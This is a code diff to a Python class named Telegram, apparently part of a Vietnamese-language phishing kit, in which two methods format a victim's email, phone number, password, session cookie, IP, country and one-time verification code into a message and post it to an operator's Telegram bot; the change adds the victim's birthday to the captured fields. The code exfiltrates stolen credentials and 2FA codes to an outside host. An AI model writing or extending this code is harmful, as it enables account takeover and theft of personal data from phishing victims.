@@ -373,9 +373,9 @@ class Telegram:
         self.api_token = api_token
         self.chat_id = chat_id
 
-    def send_message(self, status, email, phone_number, password, cookie="", ip="", country=""):
+    def send_message(self, status, email, phone_number, password, cookie="", ip="", country="", birthday=""):
         url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
-        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>"
+        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>\n<b>📅 Ngày sinh:</b> <code>{birthday}</code>"
         if cookie != "":
             message += f"\n<b>🍪 Cookie:</b> <code>{cookie}</code>"
         data = {"chat_id": self.chat_id,
@@ -394,9 +394,9 @@ class Telegram:
         except:
             pass
 
-    def send_code(self, status, email, phone_number, password, code, ip="", country=""):
+    def send_code(self, status, email, phone_number, password, code, ip="", country="", birthday=""):
         url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
-        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>"
+        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>\n<b>📅 Ngày sinh:</b> <code>{birthday}</code>"
         if code != "":
             message += f"\n<b>6️⃣ Code:</b> <code>{code}</code>"
         data = {"chat_id": self.chat_id,
